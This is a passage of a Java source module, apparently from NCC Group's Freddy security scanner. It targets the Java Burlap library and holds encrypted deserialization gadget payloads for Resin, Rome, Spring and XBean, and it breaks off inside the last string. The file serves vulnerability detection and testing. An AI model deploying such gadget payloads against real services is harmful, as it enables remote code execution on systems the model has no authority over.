// Freddy the Serial(isation) Killer
// 
// Released as open source by NCC Group Plc - https://www.nccgroup.trust/
//
// Project link: https://github.com/nccgroup/freddy/
//
// Released under agpl-3.0 see LICENSE for more information

package nb.freddy.modules.java;

import nb.freddy.modules.FreddyModuleBase;
import nb.freddy.modules.IndicatorTarget;
import nb.freddy.modules.SeverityRating;
import nb.freddy.modules.TargetPlatform;

import java.util.regex.Pattern;

/***********************************************************
 * Module targeting the Java Burlap library.
 *
 * Written by Nicky Bloor (@NickstaDB).
 **********************************************************/
public class BurlapModule extends FreddyModuleBase {
    //Resin payload data
    private final String RESIN_PREFIX = decrypt("tSYpYLuK/KYu+8CwswHgHAvwpGFnmDbLX0PgdENPoDvpAKzjoz0rqeTSfolq2q7sMGlxuIqAMie9gclp61Cp6BKcdf/BZP41kseLdpZ+i4BrXLdsVhYmbehJDx6UWvLADJ6JDL4dCCMXWGBT/RBLouSGWRE2+ObFFoN2cMe8hi81SKpRbew+y2gGXgWJVfK9vDJU0PGXgZeO5EL4LtLA1Hm8rs4WcjUEzKIctNyAfn8JDPYuHDClCcbxBlH7KNLaJNFwCA2Arz4X7I9rH4ZcrP6z6KhPYYb+KzQBu5fbd4XUgrjaMuxrXDox+yCapThKIxrwDc84mHBOi6fQLbK8HMs5H6sKOnTZdoua6vflXGvPkJl4+VRUsDxWVmexAjLUaaKL/0KCPNZN4a8Mop5/npWmPWP/MF2seQpBFwIxdBOQMQ4kNpgD0b/ttaQnLTjnv1M3rueicYcBGXp0M227/H7ukh5nNox01HrCVluaa9QiTrnIT/Bb/zty/PBO10OGqe1ByIiecI2SIksWPeHATHcdHe8gluQmL2+wjdxkn3jlR8z8rZRD4UQFnm6MC7Zj6pdcFxQ0xzToqvG7KZiKrB0S0PTsieEUFhZdiRVsg9xQEMaiwvR0g9Yad4jDr7RtQlZC0/FG9eZfoh1FHHZY7Gg48puNZcGyMRhnCbp2Yc6Z/z82sV6kGzdIAtse5BA5Ik65yE/wW/87cvzwTtdDhjfTYgstkLTPzwaX/0vma884VyYbsxF4kbiuQGZ9icThJaOAepYq2js2IDBx6s2L/5XJxsvXJJU5hMkFzFT6NIZWb345K+9B1Dr/Xqkew9/tvJwThpIlOfhjrARj3TV2RwlJqrs0VdOPxN6vjFUerYT0BMFM4Dgu7B3KnPaLjxgr29ax4jLpaGlAPnPhg+XMXdkdzzxCxa+qcFEhMlZ5Sv+VgNsyyjNo4W6WPz3dXVoc+FoVfmSq0O8JMMfD2O9gJHO458BIy0F3i2xvdXihsgzlEA0nSyb71KkLems0gAqB");
    private final String RESIN_SUFFIX = decrypt("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");

    //Rome payload data
    private final String ROME_PREFIX = decrypt("tSYpYLuK/KYu+8CwswHgHAvwpGFnmDbLX0PgdENPoDtii9l+TR1qsicXPOU4aQShggI2RO3yibDZYjXCHMBSZbCkKmEGd/+TR3sx95ZlHtkOvinyI3Kmv7CEjYNNL7e2tEAVJM1wnBrXsjIMF4WWiCozjYdkPkNLdavTaq5zYrFfPGH/T61BPEID5ILTyvOivJwThpIlOfhjrARj3TV2RxfnxYrOQe7krFignjfkioUxQYZ4ecoudORG2hitxqGBi7jd5CWnOv0kgi6K9jythD33FnTHna1PySnmHsPReKoUUpqWx7g461UOxr+Uyj3NmfsJhFAeF5a7m+PMTufTHV7TrWoVvFwl3XlLmIIpEh2rt9CqJHcihFNKYYS6eHmxyh1ey4Re/LR3ebMFYLsGS5fApi3fQUOLRs+FxdCrkwFrXLdsVhYmbehJDx6UWvLAv0GpuVBUq51LRPMXEISo4tiBSr+T1HykHSfr/1v8aIyaScuaLUcBumdry3md9ElUnLQW2PmBC5TOLWsL2TiR/cQhn3fnAb9AHvoqTuQ/h6uTXf0TN03EaaP6g7KKw89nXphbOPsOmlpevnPTLNg1KmdkVxuW+xg86Hr3M1lS9RPWFn7hnk4WW2YluBPP04etTr63Jm3UNxeRqCJvou+H6idmUOJD6M/5Z6Yks5U5EdV3HR3vIJbkJi9vsI3cZJ94n+WZNWB3kI5YjrsyeNzbn9mpi8jwLwzAMC6pN0GbJGB1EvouC9X7StlcYDPlcrM66XXskT14y3Jq9KVFRawd/5NGh2/2Q7ldlnhCJDdkinA=");
    private final String ROME_SUFFIX = decrypt("d9XQatkUpS+3MMP2GbKWrJDlPvjxCdpA5cGX+77xlw+NE8LXxFDI6Br/rAZ6yyCMloIJrts9y2+fKpCbBV0fmanpcVcuMWbd7519c6wyoKJ17qU7aZlGVYzwS/afkJWKrc6ptSEzDGAxYSBWYlxRdr4PvgWRQ1KZgm91rH4HISzbo1PqoqzpA0EgMJAmRCBfcVDjH+WJ0KyEtB9Gg5yc7tI3S1iGuNyi8CXYmsBoJnJ1P1bcdukZ3oz7cBBv7tPMEf3ffReK9uZqTVkckDMzVqff5azqBqZj6VKRKMFv5PBmE07SmNkK5mqxEUgRHK+KW09cVl0FT3ovjZ4ms66aXUe3rs+ZhcPXOCByFn8SmPM2VD4JPZeRpudWOyjYMfHB256zUEkjX7I5odpPpTTXeL5ilWvxJlawRjmcqYeKoyzIsFvjtV3OJ2eufxzy//urFRIP8pohWxkk1GonYDHfP50C62147bi/XtvVzZ8WV7yv5JHOW+rtA5df/KytH7IO4xj+LD9tYW9kTfdhNNBo/Qe6+cHwZ+qnH4k+miAOcPXWjDt1AIVQkI3qbRJ6jO0YlkEy33aJQT1laBpskv+ehB2AM2t/RqMBTVknNrSVqEcBqpVHaDcsYSicGw5XMZXd1Fich+DtOsUNVYJmm4hl/Wmii/9CgjzWTeGvDKKef57T6ir6Xbek1lV8ndN9As13aaKL/0KCPNZN4a8Mop5/nqMwEW97gQRxvrqeYzbXVmlpoov/QoI81k3hrwyinn+eM021NEKulFiBMvSzr1c8YUiuw4r3ThGMXFwpzRwRQrkaoM279rNF1GuBXBG4/YzAQlZC0/FG9eZfoh1FHHZY7G+7RKdh1hcqjBBslCtBo9Rv4tX+mwqpookWa2/NN/ka9Tg6lGR9TnTGRXiF2GEBiRHLFxNW1p+yifRP6GDgjARoTBkDfxh+ZUI6ePlwZY8QVP+zFj0GptdwsivQAITVo2+O8g80o+UxaiLrdIbUMmqoFiSkgO4V5INnrRlJtI/8Ecr3MpjfLY7AacGthGRaypj6MsAei1k2fUhUwUOnnNQ6HpV0z+0UbrF7eGg8IM1ruP655++Cx97wehDdyhoO66WALvdbdexvhvva3lf2mfll0D2xqlKiAFtf1jj316seKQDv8XvjvaG8wu4Ov9aIr9z0lEbPKyRp+2iuO36kzqiz9ARcKOoaKVYraCnwvBXhcBacpExfR5h7P3U8QwhyfO5XnXs40RDqjcPmQESi/iAFjivTvChzy3zVnJhA8yQ+ziajpbTu9q8zOvllWcxKxibDbfa2MOkx6YC357VXlAkvykNn7wdufhVsILPTg/SrS99WaoqCl9KMMouOBb4wTsr8i3CLAMAeQMcSwQYT5V0zgaFbxsjZ7kAOTteJCxpgIZU1YkYO1HfT0zQepTiYjAdIzjonygsJt12WU+6kw8Ie+W6PnpeN984m7c4ZFkGnABkE5PEessaWUMtA+S7fUkiuw4r3ThGMXFwpzRwRQrlj4frZdlZMYjJk9pMTnQA/9+mmMw06H+bma2RSyjut8x0S0PTsieEUFhZdiRVsg9xVrs2ByBy6/y5iCAjpIq2Lk3QlR2jylX2P0p1Xknh5/tw3fBseWsTXa3CeuKYgwM5l8UHJTN7iQKp3WUsW1sbraaKL/0KCPNZN4a8Mop5/nhtfABWGK3rMOEm0jpK1wVUiTrnIT/Bb/zty/PBO10OGE4FU/IMIf9vYhOJPl6P8wpN0JUdo8pV9j9KdV5J4ef68yXhvjE6KN2t/omWfmESCbimqZQn/95xWi86mZeBupSges2m08OJ0eFrjnzetIWFYH5MNHRLhJarXTm027N7F69cp8dH1oHHHDZPCzSwmjb2HyYBIRpjXHKvTu6zGMYnxaWgPjNY+16DvDc7jNFBnsbKVpNb175IeOlQgAXxT9QrZl/C2Y7FFYtHvOsWns8o=");

    //SpringAbstractBeanFactoryPointcutAdvisor payload data
    private final String SABF_PREFIX = decrypt("tSYpYLuK/KYu+8CwswHgHKBCm2y3HkoZhsl2xy7YgX5IuCnrfKQRpKLAjemI62nkodkVPXVqRf3twZE8W8FDbbOynxVyQeWKoUUZoQnW174SlOWayXPLPauHyJdSJ6Gr2YYClaf1M9oE1bidlILDNtNGxb6aSo5A3BvCGCkEsII5TCWQoWjm329BXNShUYYL");
    private final String SABF_MIDDLE = decrypt("d9XQatkUpS+3MMP2GbKWrHgy2uBlSFJI3AQ1qBSGKehpoov/QoI81k3hrwyinn+e/43ox52EKPw0p1wTCGfmY7RAFSTNcJwa17IyDBeFloj2YF8FLoau2WImvotWij36QMK96wxeyscQ+D6bI46u2gS95wXeWRhdw5LzBFXD21WBPICFkxhwevZNfziPPZi7eZU2qk7yc6kBOoUaW26nbZ98A8FG+ihnB4fkvzjkYcSVJRbqMt/XZ9bjVuVhUP02LiCegIOF/vwohZE0KNadh9iEAd5OcPrLCUItaql2QipwlCCheTunidxeoMH91reNeW9ULi4hEOTL9ZOEDzxetNebBvIao179ewrM8q3PqpFK/iAX09/wdkqprYLGncgmN5tyIHqpSH/ASbpoGoknl3ymBER8vbUkH1QeFnfzR+x14z/QoTooBVGOciYL+9L45CDmsDma82UCUN9Fm2l7wdGQWihgCuAE+o16DmT1LW5a67F3eJ573DVx5mzocavS");
    private final String SABF_SUFFIX = decrypt("4uZg+TU2Cliy1zdEyjpl+eEj5XPoSDZ9C5HtymjEkT65GZKFSVLKoo3Yu3jtNkn+jZuehKwdCWHJZZlS/LgPh4KmjyY8m4MAxA5jt6ymo2Jo/HCaRkAD+kBYO9i7ZEC08W6JUaowEC/tzcP5Bemf2TtNrvHsBADx+IrPZkedcE/w6CWCvMirgwxjVtqI6XtnTMrFmdnXPeHW6cy7L8yyY0QYnLBPKLpko32fi1Gh3uZ1p6xcHTMZ8P5lcNh+XUER4gThawuU4FIzulaYTOnnTr+qEgr09yIfYHuxp8vdAdfwohIjhIZcAneoKcQHn6doR9LMq09NQT63sQpQAMPcdEi4Ket8pBGkosCN6YjraeTKJpGNo1a0iGGnznT8I9L181lOLZFN/Jpai5qYd0dSCjUf0us/2HTB3cDRdvlbTdkG9Yh/XoDWMQZ7+6GD6ec/DiOLgLyDYhp27FlEMu7+WozCH4V/vk+jF3GvW/tb4NfNIC2kz5vSExLvSPCy47wm59VY2JtgbOcgovgNT6g+T6WmgxVBejZ8iIdqJPNK65b1+Cui02QGfKRc2S9NE7FBU/za1R5TK3ich47Llt8+p5PQK1ddAzLTAzbWj0NZ67lNdB2Q7MgGJeMK0H2T/mNaCfb9DV+djqju6jE6DEytdQJv2achHFsg/sfC39bb2w6s+zMdEpSvBxG5LG3ecAQLWNTuuIl+vVNCNRBj+rzp13xwrBo9r7pH0bfT9cwddsxeghJEXyOQtU/zTpfPgdNYccqj8GIswAh4uWwjv634ggS+Y6VfvXnBNel6zSMnaDbIr1hFmUsLl3hpniR9D3IipB0VWKlaxqlk0GCCtkk+paqAdazBCiCC40eKXqMyddXmwGWm7P71pnSmkpnFfrbQdx0d7yCW5CYvb7CN3GSfeK32GS9gqGkJNtALVuheQPQWUebyHfmhuAqn87YQv5Tx");

    //SpringPartiallyComparableAdvisorHolder payload data
    private final String SPCA_PREFIX = decrypt("tSYpYLuK/KYu+8CwswHgHKBCm2y3HkoZhsl2xy7YgX5IuCnrfKQRpKLAjemI62nke2yK1PGS0yFWgBnBmjWMeWi7ULecqFibtBDybjVGRcLY3uPg6gYU5TTHoNNfN/EbQu5Iqwy0ffYVJUvzO8GQu0fSzKtPTUE+t7EKUADD3HRIuCnrfKQRpKLAjemI62nkt2yQbdAKzEuc3C8RouTM0N+K6lPAoxSnbnY/KONrnTygwKf/BBcuAkJN3PjHbZEdHX9ggzFdGXsBeHscCjaOK5EuoX1M0f1F3RT6Xi0FfGmNL4jOHIVanvsuunPUAvbfAy8VrJut5idnrvxuxvBhHcaTi1awPfW0Z5O7505MwFCpYDjAgHe8vhjs7sr+6bCcmYieODTBobr+asrAm+TuFBtao6Ef3ZsFyTtG57ps/95s611fUlDlHQ5INccFrI55tIYQTpa494Igc404X0Ddw16CEkRfI5C1T/NOl8+B01hqEKmnzqx6N0m3lDNO6tp/ad1aDwdrHssngkSiZmuC7+BsD6SVvAUi+BdWN/gT+zgMUoswMtiFrT6qv0T8+b2zjlDuxyOYkMU+ax8GOxDUoHpP40js86QfUygTIHwCVuohhBmMsfJ+s67ag3c85rY5DfIQmfDQfLsqIOT9urlvmrOitn5u3hCQZaoFPLCejGKEYYeWXSG/JhlhUsfRszKBAW6UqCf6LrRUFbnM8R8GxBSjOwktjRGPQpha7Pj2PgKfAVd/CjdFcXqzOrDnTUU5pyfP6zMAUzX+daQ6j/Gj9txJtA8jQc5QT5DiXZUEbghzuOfASMtBd4tsb3V4obIM0AHakxjjkUBz2ileA4sugF8U4LZSiZz5n6ceXUCjKnXB9/ziH7AIQikuSVsKA+NxiPy3qfeB+z3Gr1p9UXEiCN4j07TaRnicovdGc7/a+ZLzUcz1qqwm1EYYDNhEp7/ekmTUUdrbn6PGGOYqlGoMK6VBBP2UdYgLeb8wfDYthR5IrsOK904RjFxcKc0cEUK5NK8XuAA93nn74cFsBkf7Jwb8w+WY75JWGS4pnGPKgAUdEtD07InhFBYWXYkVbIPcmfvT0tVrG+ELHmTjdXK9RbZ3nMYRyTf3o/u2Wfy5CxdIrsOK904RjFxcKc0cEUK5JwPXvZAg8QDiaEzIqkzpymraaSZ0Z/krnbcuvzRxvBuTdCVHaPKVfY/SnVeSeHn+VKwx7S7owMPMQ+4/d5Izg/VSjoXXL+5eGyawbydBQmqyxbZkJdCliSMSz0ly4bwEPmwK1FkHeyJZxBKQneXjAY3Rcg72XMvEc1sNxm8Em+2nrZHyX8HJZbSQDgidrhHR9P7UndF+qwov8OBq/GYAM49Bgerk7/09K+SEwP86PgPOyd//wz2nw6VKiQx1OzLy0am7ezTIzNsf4FVLvJP13rhwLSktE/DDJkL5B0gL1nICN9mzqsmQaSjThzsDM9PgilqkIsLFLVyoScKbKCAJPsEwWwSGs1UiWF2hrMiqo621CYt/Bs5uYr06RtjFZ/CjNKWKF693O3/N9Ywi5zLSVP2rljT0qoMs4dUfH6/OFe5ZAJsKHbCTIjFp3AhTQaOh9XLWIMJMvK3h/m2UUl6Ef6DSalJgBdpHz04rVE4K/QV6oMDSb4okh4QgONwrVQs0zdlx925UKXMsSOIpsABghB0S0PTsieEUFhZdiRVsg9x55YjXHfonFgZP0pPA/gqKH2XWE1DfydP6YNADAG97fARmY+QhPZte1xf03pZ2oNc6NW5a0qc/jXsr0ULVnVmW6oKvE8QXwwuSJXVH6iLnOhA4cZGf48I2x6ZCcdheXHxdBgTkXCyQGbzUXGl6QuFWHa+avWuDIgoajt3n4tAaq3EgpkavmVsK+1bbNVZkG549zvhAFohDd3OmpdQFpRsv");
    private final String SPCA_MIDDLE = decrypt("d9XQatkUpS+3MMP2GbKWrA7TzXhvG1CKS1rbncFKT9y0QBUkzXCcGteyMgwXhZaI9mBfBS6GrtliJr6LVoo9+tZi3Lak9knLgCZaN7jtG1ZXSmXZV7TI+66YYUfZC58oQTzxiIdsh8bWY9ImWHmOKRMMkXmwFb7g3hw8BmHk+KdEWcyiXekgANRGZXcf0LWFcDGjM/7QQBO93ICjUfaBWQ/uH5kMt/E2SlbNjUlooUlp+ZLCi1Ao0BxmiWGyPzA8s/QEXCjqGilWK2gp8LwV4fx/MmmBnA8lg6k2yci46bDt6L0ifdK+vnRc7jAUObTj9d/AiqapefRAaX3ZGso/SQ==");
    private final String SPCA_SUFFIX = decrypt("4uZg+TU2Cliy1zdEyjpl+eEj5XPoSDZ9C5HtymjEkT65GZKFSVLKoo3Yu3jtNkn+jZuehKwdCWHJZZlS/LgPh4KmjyY8m4MAxA5jt6ymo2Jo/HCaRkAD+kBYO9i7ZEC08W6JUaowEC/tzcP5Bemf2TtNrvHsBADx+IrPZkedcE/w6CWCvMirgwxjVtqI6XtnTMrFmdnXPeHW6cy7L8yyY0QYnLBPKLpko32fi1Gh3uZ1p6xcHTMZ8P5lcNh+XUER4gThawuU4FIzulaYTOnnTr+qEgr09yIfYHuxp8vdAdfwohIjhIZcAneoKcQHn6doR9LMq09NQT63sQpQAMPcdEi4Ket8pBGkosCN6YjraeTKJpGNo1a0iGGnznT8I9L181lOLZFN/Jpai5qYd0dSCjUf0us/2HTB3cDRdvlbTdkG9Yh/XoDWMQZ7+6GD6ec/DiOLgLyDYhp27FlEMu7+WozCH4V/vk+jF3GvW/tb4NfNIC2kz5vSExLvSPCy47wm59VY2JtgbOcgovgNT6g+T6WmgxVBejZ8iIdqJPNK65b1+Cui02QGfKRc2S9NE7FBEymTqnmC0xS+431UyDHws2KnxXcVs2RjkwQRsJiF8+RIrsOK904RjFxcKc0cEUK5yCNLcwi2tGIosC0UhgGUVniOVwjJcZW6bHB2KlQC6xkjGvANzziYcE6Lp9AtsrwcVMqt8KN5dGj5ukcNCejTCXWMeEGfYbRz9kdoBImrsIGQMQ4kNpgD0b/ttaQnLTjnKEXWP4tjnirJ+leU9i8UBc3ZcfduVClzLEjiKbAAYISsfTaoK3FeskMfGa/UuuQQYGqIgROUso1Z47cXe7s1Bris20oWK0Zd3fjkx4d2QjDXDm2VyF5PLTMxgKsV/tYuqUCZC1Acv76/uQXRSb5nXARmY+QhPZte1xf03pZ2oNc6NW5a0qc/jXsr0ULVnVmW+l7NWzyljZ7+YFcnWHDkI8FcUqkwX15O9ottBTyBfZ4XGzKNIvjGkomlhJSY09DzvRCk1B+UblZMollSilI73GfBXq/h67T8a/meyn1qIvRqybIYGTTW8jmTeELJcJ3cyCWeDOP+VvuHUZDnJprvQNjgD1sFdkFOQCEsJAxGRVNI24ry5LtebF2pv5jrNWYu55O74acKYzzjskYwXtVEaOjGaK/3tgVonKvK1RyQFWIb2K2ZrNgwX1TM7jAg6i7yukMgt7PL1WK0wq4D06oXlF+mXYbhkc4xA60dt03KfukfPGcM3ye/WYNpPwi2SBq9A3y1ihr+l66Bdlsr9dROgg==");

    //XBean payload data
    private final String XBEAN_PREFIX = decrypt("tSYpYLuK/KYu+8CwswHgHKBCm2y3HkoZhsl2xy7YgX5IuCnrfKQRpKLAjemI62nke2yK1PGS0yFWgBnBmjWMeWi7ULecqFibtBDybjVGRcLY3uPg6gYU5TTHoNNfN/EbQu5Iqwy0ffYVJUvzO8GQu0fSzKtPTUE+t7EKUADD3HR5oR4o72SjhbBMB2zC863o/npZD+TyDdCLd7pUAenwE85in3MB0WuksSYddjmk720PIgtb0+AFhwmc6AmnSZJ9v2uCEGm0szvOcHDNKj8IWi2YsZoKml/GTCwJtjXi8HW4cC0pLRPwwyZC+QdIC9ZycSCmRq+ZWwr7Vts1VmQbnp6Uj7PlBdZQQJqJvrcSyWCYQ3Jy4TK3KWTnjmqBqZcRx4ErTq270Krl5/TrZs7FizYhmAaECA5LVeRekXkyt9uxajmGTVEhpYWl16kjd2xUk3QlR2jylX2P0p1Xknh5/skvor69j0Zbjwm299BVA+N+MOo+vrhqHQPAvOPt7KB07GdOmAuw1wuzA3tD+MgEdEloxBg1lug1Ko0t09USmoFrXLdsVhYmbehJDx6UWvLAI+hXRVjLGF4YvnO9D5DkYPxyW94NOlHmUvxZOUx2NS+N6whdCWfRzy5oaHvUcwz9n+cpNkAu/oMgqG5W4F5m8awCR2giR3Ch6UXZDtH8s4CQQadRg6doqJXW8Cdq//xGbyP/p3sBg2X105xOG2ah63DnGixL02Ptr2HWSYYny1c6g2Uv/1afmS6mv+xvLjRethjS3yFTFV16HER55Rt7Rz3O+EAWiEN3c6al1AWlGy8=");
    private final String XBEAN_SUFFIX = decrypt("d9XQatkUpS+3MMP2GbKWrJ6lpZXFaNmJdW2VQFh/ONeSF66ZbRjA90xJbtT0kPMbYb6xXLUl/c4ihnvM4HNTXBhYJgSwPZOJcy0A6X4WiYKYTKFwvw2aKP/yKnZRlhM3yl7Fbiks4mqOcGKcjnh/zDhXJhuzEXiRuK5AZn2JxOHbIJQ8xWJPiQ20uvg/vfzi2sE5n73EaVBj40hA6bCRlpVyhGx7eA9IO4notDI01Va0LkBozfCSHwJAATiKS5R0Z60A/K68zanCmd8Crt5WHQ03rl+1nHqhb4ElSh747M24cC0pLRPwwyZC+QdIC9ZyLToVcXFPYeZGGH8b1KtII0aAtlO+MfDOozEGXb48yjjp+xrdBZL5KqMcQPb9i1Cp0qycV2QT9EKLseUPGLncQ/jj2XFLVAGzvoZQmJpIORJWJ04cv36NQ60uvQXeCJ3Tg/U+elm29uDRmmJyycGwrvqthZYmQbkpSLSopGKXUfatJFGP3IO/d2alkVBHEbX94d7qyWX0YUyDRgp4sCpvs4N3tgJh0FsjPYfpjQrtr7VVPfnu/afx1dH8MuMBnoyyZY9N8M/XKXSarjjsCaH3VCJOuchP8Fv/O3L88E7XQ4aRLG7192fiQauQ2h2nm5SV2HcEZhS2/sNnhZno+hSdMnIePrxbffNo9KTd6kFdXRV4IJaGi3IaV56pPVTPIVUKSK7DivdOEYxcXCnNHBFCud59digSk/gDufSXr/PnEOeKQw/aux2UqTi4NLn4r2NZmDQae+qYLSilB9twdi690WIHEcOpBWkrseO3pmIrWv5IrsOK904RjFxcKc0cEUK5LQGyJ2u8N+HuuhGIGH5ig3cdHe8gluQmL2+wjdxkn3hwzRfnTw3hZhncnITBpVXZblguLZaMnjV+DCmeIbb+lV6CEkRfI5C1T/NOl8+B01hgU3nWduQ+95SKZZCVvs+cyBj75qUhuRvtAhg3lT6JEUiuw4r3ThGMXFwpzRwRQrnV9wFxTEg9RAvZShtGHQtcrtwhnTnBcWHTckpSWmZuX0JWQtPxRvXmX6IdRRx2WOzpt7uEjZZ8qE2yNGjFt9jNIr+r7Df4qMyRVve6GiszQ9V/3Ejds6YRSkRipADh77p+an4EXffZiGd8I/I5wZmB2bOFdjblHt2GehSCuperiA4AKL6io